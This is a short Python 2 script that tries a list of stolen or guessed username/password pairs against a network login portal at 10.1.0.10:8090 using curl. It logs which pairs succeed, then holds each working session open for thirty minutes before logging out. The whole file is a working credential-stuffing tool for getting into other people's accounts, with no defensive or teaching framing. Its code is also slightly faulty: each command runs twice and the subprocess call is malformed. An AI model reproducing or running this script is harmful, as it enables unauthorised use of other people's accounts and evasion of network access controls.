import os
import time
import subprocess
import sys
import re

fhand = open("password.txt", "r")
fw = open("edited.txt", "a")
user_list = []
pass_list = []
for line in fhand :
    username,password = map(str, line.split())
    user_list.append(username)
    pass_list.append(password)

fhand.close()

for i in range(len(user_list)):
#   print " username is %s and password is %s " %(username, password)
    cmd = "curl -k -d mode=191 -d username={0} -d password={1} https://10.1.0.10:8090/login.xml".format(user_list[i], pass_list[i])    
    subprocess.call(cmd)
    str1 = str(os.popen(cmd).readlines())
    if re.findall('could not log you on.', str1) :
        print "wrong combination, username= ",user_list[i]
    else :
        if re.findall('data transfer has been exceeded,', str1) :
            print " data limit exceeded for username= ",user_list[i]
        elif re.findall('deactivated', str1) :
        	print "Account deactivated"
        else :
            strn = "{0}, {1}\n".format(user_list[i], pass_list[i])
            fw.write(strn);
            time.sleep(1800)
            cmd1 = "curl -k -d mode=193 -d username={0} https://10.1.0.10:8090/logout.xml".format(user_list[i])
            subprocess.call(cmd1)
         #   time.sleep(15)
